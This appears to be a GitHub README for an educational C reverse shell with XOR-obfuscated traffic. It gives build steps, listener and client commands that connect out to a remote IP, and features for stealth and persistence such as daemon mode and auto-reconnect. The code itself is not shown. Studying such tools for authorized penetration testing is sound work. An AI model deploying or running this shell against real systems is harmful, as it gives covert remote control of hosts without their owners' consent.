# Encrypted Reverse Shell in C

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Language: C](https://img.shields.io/badge/Language-C-blue.svg)](https://en.wikipedia.org/wiki/C_(programming_language))

> **⚠️ EDUCATIONAL USE ONLY**  
> This tool is designed exclusively for educational purposes and authorized penetration testing in controlled lab environments. **Unauthorized use against systems without explicit permission is illegal and unethical.**

## Overview

**ReverseShell-C** is a full-featured educational reverse shell implementation in C, designed to demonstrate core cybersecurity concepts including:

- **Network Programming**: TCP client-server architecture using POSIX sockets
- **Encryption**: XOR-based encryption for command and output obfuscation
- **Process Execution**: Safe command execution with output capture
- **Persistence**: Automatic reconnection logic with configurable retry delays
- **Stealth**: Linux daemon mode for background operation

This project is structured as a portfolio-ready open-source educational tool, perfect for learning red-team techniques in authorized lab environments.

## Architecture

### Client-Server Model

```
┌─────────────┐                    ┌─────────────┐
│   Server    │                    │   Client    │
│  (Attacker) │                    │  (Target)   │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Client initiates connection  │
       │◄─────────────────────────────────┤
       │                                  │
       │  2. Server sends encrypted cmd   │
       ├─────────────────────────────────►│
       │                                  │
       │                                  │  3. Execute command
       │                                  │     (popen)
       │                                  │
       │  4. Client sends encrypted output│
       │◄─────────────────────────────────┤
       │                                  │
       │  5. Server decrypts & displays   │
       │                                  │
```

### Encryption Flow

All data transmitted between client and server is encrypted using XOR encryption:

- **Commands**: Server encrypts before sending
- **Output**: Client encrypts before returning
- **Key**: Configurable in `common/crypto.h` (default: `0xAA`)

**Note**: XOR encryption is used for educational purposes only. It is **not cryptographically secure** for production use.

## Project Structure

```
ReverseShell-C/
├── server/
│   ├── server.c          # Server implementation
│   └── Makefile          # Server build configuration
├── client/
│   ├── client.c          # Client implementation
│   └── Makefile          # Client build configuration
├── common/
│   ├── crypto.h          # Encryption header
│   └── crypto.c          # Encryption implementation
├── docs/
│   ├── architecture.md   # Detailed architecture documentation
│   └── usage.md          # Usage guide and examples
├── README.md             # This file
└── LICENSE               # MIT License
```

## Features

### Server Features
- ✅ TCP socket listener on configurable port
- ✅ Interactive command shell interface
- ✅ Automatic encryption of outgoing commands
- ✅ Automatic decryption of incoming output
- ✅ Graceful client disconnect handling
- ✅ Sequential client session support

### Client Features
- ✅ Outbound TCP connection to server
- ✅ Automatic reconnection with configurable delay (default: 5 seconds)
- ✅ Command execution via `popen()` (captures stdout + stderr)
- ✅ Automatic encryption of command output
- ✅ Linux daemon mode for background operation
- ✅ Clean error handling and resource cleanup

## Build Instructions

### Prerequisites
- **Operating System**: Linux (tested on Ubuntu/Debian)
- **Compiler**: GCC with C99 support
- **Libraries**: Standard POSIX libraries (no external dependencies)

### Compilation

#### Build Server
```bash
cd server
make
```

#### Build Client
```bash
cd client
make
```

#### Build Both (from project root)
```bash
cd server && make && cd ../client && make && cd ..
```

#### Debug Build (with symbols)
```bash
cd server && make debug
cd client && make debug
```

#### Release Build (optimized)
```bash
cd server && make release
cd client && make release
```

### Clean Build Artifacts
```bash
cd server && make clean
cd client && make clean
```

## Usage

### Basic Usage

#### 1. Start the Server
```bash
./server/server [port]
```

**Example**:
```bash
./server/server 4444
```

The server will listen on the specified port (default: 4444) and wait for client connections.

#### 2. Start the Client
```bash
./client/client <server_ip> [port] [-d]
```

**Examples**:
```bash
# Connect to local server
./client/client 127.0.0.1 4444

# Connect to remote server
./client/client 192.168.1.100 4444

# Run in daemon mode (background)
./client/client 192.168.1.100 4444 -d
```

#### 3. Execute Commands
Once connected, type commands in the server terminal:

```
shell> whoami
shell> pwd
shell> ls -la
shell> exit    # Disconnect client
```

### Advanced Configuration

#### Change Encryption Key
Edit `common/crypto.h`:
```c
#define ENCRYPTION_KEY 0xAA  // Change to any byte value
```

Then rebuild both server and client.

#### Change Default Port
Edit source files or pass port as command-line argument.

#### Adjust Reconnect Delay
Edit `client/client.c`:
```c
#define RETRY_DELAY 5  // Change to desired seconds
```

## Educational Objectives

This project demonstrates:

1. **Network Programming**: TCP socket creation, binding, listening, connecting
2. **Encryption Basics**: XOR encryption/decryption implementation
3. **Process Management**: Command execution, output capture, daemon processes
4. **Error Handling**: Robust error checking and resource cleanup
5. **Security Concepts**: Reverse shells, encrypted communication, persistence

## Security & Ethics

### ⚠️ Legal Disclaimer

**This tool is for educational and authorized lab use only.**

- ✅ **Authorized Use**: Penetration testing in your own lab environment
- ✅ **Authorized Use**: Educational research with proper permissions
- ✅ **Authorized Use**: Red team exercises with written authorization
- ❌ **Unauthorized Use**: Running against systems without explicit permission
- ❌ **Unauthorized Use**: Malicious activities or illegal hacking

**Unauthorized access to computer systems is illegal under laws including the Computer Fraud and Abuse Act (CFAA) and similar legislation worldwide.**

### Security Considerations

- **XOR Encryption**: Not cryptographically secure; easily broken
- **No Authentication**: Server accepts any client connection
- **No Integrity Checks**: Data can be tampered with in transit
- **Command Injection**: Server has full command execution privileges

**This tool is intentionally simplified for educational purposes. Do not use in production environments.**

## Documentation

For more detailed information, see:

- **[Architecture Documentation](docs/architecture.md)**: Detailed system design and workflow
- **[Usage Guide](docs/usage.md)**: Comprehensive usage examples and troubleshooting

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Acknowledgments

Created as an educational resource for learning cybersecurity concepts in authorized lab environments.

---

## Author

**Vision KC**

 [Github](https://github.com/vision-dev1)<br>
 [Portfolio](https://visionkc.com.np)

---

**Remember**: With great power comes great responsibility. Use this knowledge ethically and legally.
